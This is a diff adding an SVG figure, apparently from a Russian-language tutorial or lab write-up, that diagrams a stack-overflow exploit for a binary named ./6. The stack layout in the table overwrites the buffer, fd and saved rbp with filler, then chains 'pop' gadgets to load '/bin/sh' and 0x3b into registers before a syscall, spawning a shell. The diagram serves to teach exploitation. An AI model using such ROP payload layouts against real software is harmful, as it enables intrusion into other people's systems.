@@ -1,0 +1,57 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="860" height="612" viewBox="0 0 860 612" role="img">
+<title>Рис. 7. Эксплоит для исполняемого бинарного файла ./6</title>
+<rect x="1" y="1" width="290" height="42" fill="#e8edf2" stroke="#64748b"/>
+<text x="13" y="29" font-family="sans-serif" font-size="18" fill="#172033" font-weight="bold">Стек</text>
+<rect x="291" y="1" width="568" height="42" fill="#e8edf2" stroke="#64748b"/>
+<text x="303" y="29" font-family="sans-serif" font-size="18" fill="#172033" font-weight="bold">Комментарии</text>
+<rect x="1" y="43" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="71" font-family="monospace" font-size="18" fill="#172033">...</text>
+<rect x="291" y="43" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="85" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="113" font-family="monospace" font-size="18" fill="#172033">“A”*32</text>
+<rect x="291" y="85" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="113" font-family="sans-serif" font-size="18" fill="#172033">массив buf ([rbp-0x30])</text>
+<rect x="1" y="127" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="155" font-family="monospace" font-size="18" fill="#b91c1c">0x41414141</text>
+<rect x="291" y="127" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="169" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="197" font-family="monospace" font-size="18" fill="#b91c1c">0x41414141</text>
+<rect x="291" y="169" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="197" font-family="sans-serif" font-size="18" fill="#172033">файловый дескриптор fd</text>
+<rect x="1" y="211" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="239" font-family="monospace" font-size="18" fill="#b91c1c">0x41414141</text>
+<rect x="291" y="211" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="239" font-family="sans-serif" font-size="18" fill="#172033">сохранённый rbp</text>
+<rect x="1" y="253" width="290" height="64" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="281" font-family="monospace" font-size="18" fill="#172033">0x401163</text>
+<rect x="291" y="253" width="568" height="64" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="281" font-family="sans-serif" font-size="18" fill="#172033">адрес возврата в main, перезаписанный адресом</text>
+<text x="303" y="305" font-family="sans-serif" font-size="18" fill="#172033">гаджета &quot;pop rdi ; pop rsi ; ret&quot;</text>
+<rect x="1" y="317" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="345" font-family="monospace" font-size="18" fill="#172033">0x404060</text>
+<rect x="291" y="317" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="345" font-family="sans-serif" font-size="18" fill="#172033">новое значение rdi – адрес строки &quot;/bin/sh&quot;</text>
+<rect x="1" y="359" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="387" font-family="monospace" font-size="18" fill="#172033">0x404068</text>
+<rect x="291" y="359" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="387" font-family="sans-serif" font-size="18" fill="#172033">новое значение rsi</text>
+<rect x="1" y="401" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="429" font-family="monospace" font-size="18" fill="#172033">0x401160</text>
+<rect x="291" y="401" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="429" font-family="sans-serif" font-size="18" fill="#172033">адрес гаджета &quot;pop rdx ; pop rax ; ret&quot;</text>
+<rect x="1" y="443" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="471" font-family="monospace" font-size="18" fill="#172033">0x404068</text>
+<rect x="291" y="443" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="471" font-family="sans-serif" font-size="18" fill="#172033">новое значение rdx</text>
+<rect x="1" y="485" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="513" font-family="monospace" font-size="18" fill="#172033">0x3b</text>
+<rect x="291" y="485" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="513" font-family="sans-serif" font-size="18" fill="#172033">новое значение rax</text>
+<rect x="1" y="527" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="555" font-family="monospace" font-size="18" fill="#172033">0x40115e</text>
+<rect x="291" y="527" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="555" font-family="sans-serif" font-size="18" fill="#172033">адрес syscall</text>
+<rect x="1" y="569" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="597" font-family="monospace" font-size="18" fill="#172033">...</text>
+<rect x="291" y="569" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+</svg>
